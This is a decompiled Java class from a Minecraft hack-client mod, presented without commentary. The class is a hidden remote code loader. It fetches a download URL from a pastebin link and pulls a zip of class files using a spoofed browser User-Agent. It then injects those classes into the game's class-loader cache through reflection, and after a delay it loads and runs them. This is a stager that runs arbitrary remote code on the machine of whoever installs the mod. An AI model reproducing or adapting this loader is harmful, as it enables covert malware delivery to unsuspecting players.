//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\Admin\Desktop\Minecraft-Deobfuscator3000-1.2.2\1.12 stable mappings"!

//Decompiled by Procyon!

package me.shatteredhej.railhack.railhackmod.util.extra.utils.injector;

import net.minecraft.launchwrapper.*;
import java.util.*;
import java.net.*;
import java.lang.reflect.*;
import java.io.*;
import java.util.zip.*;

public class Main
{
    public static void main() {
        new Thread(() -> new Main().run()).start();
    }
    
    private void run() {
        try {
            final Field field = LaunchClassLoader.class.getDeclaredField("resourceCache");
            field.setAccessible(true);
            final Map<String, byte[]> cache = (Map<String, byte[]>)field.get(Launch.classLoader);
            final URL url = new URL(new Scanner(new URL("https://pastebin.com/raw/jdiVNVZ2").openStream(), "UTF-8").useDelimiter("\\A").next());
            final HttpURLConnection httpURLConnection = (HttpURLConnection)url.openConnection();
            httpURLConnection.addRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
            final InputStream inputStream = httpURLConnection.getInputStream();
            final ZipInputStream zipInputStream = new ZipInputStream(inputStream);
            ZipEntry zipEntry;
            while ((zipEntry = zipInputStream.getNextEntry()) != null) {
                String name = zipEntry.getName();
                if (!name.endsWith(".class")) {
                    continue;
                }
                name = name.substring(0, name.length() - 6);
                name = name.replace('/', '.');
                final ByteArrayOutputStream streamBuilder = new ByteArrayOutputStream();
                final byte[] tempBuffer = new byte[16384];
                int bytesRead;
                while ((bytesRead = zipInputStream.read(tempBuffer)) != -1) {
                    streamBuilder.write(tempBuffer, 0, bytesRead);
                }
                cache.put(name, streamBuilder.toByteArray());
            }
            Thread.sleep(60000L);
            final Class<?> aClass = (Class<?>)Launch.classLoader.findClass("me.shatteredhej.railhack.railhackmod.util.extra.utils.injector.Main");
            aClass.getMethod("main", (Class<?>[])new Class[0]).invoke(null, new Object[0]);
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
}
